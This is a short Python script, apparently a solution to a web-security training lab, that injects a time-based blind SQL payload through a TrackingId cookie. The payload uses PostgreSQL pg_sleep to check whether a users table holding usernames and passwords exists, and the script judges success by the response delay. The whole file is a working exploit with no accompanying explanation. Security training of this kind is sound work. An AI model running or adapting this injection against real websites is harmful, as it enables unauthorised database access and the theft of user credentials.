import requests
import time

url = "https://0a50000703a70758818e89b0006c00e8.web-security-academy.net/"
trackingId = "1cepcbRG5tHuTVFk"
payload = f"""{trackingId}'||(SELECT CASE WHEN EXISTS(SELECT username,password FROM users) THEN pg_sleep(5) ELSE pg_sleep(0) END)||'"""

cookie = {
    "session" : "d6kxfXxIsu1TYHQGcldHdwsFUH5gLDSx",
    "TrackingId": payload
}
start = time.time()
response = requests.get(url, cookies=cookie)
endtime = time.time() - start

if endtime > 5:
    print(f"[+] Trigger Success")
else:
    print(f"[-] Failed")
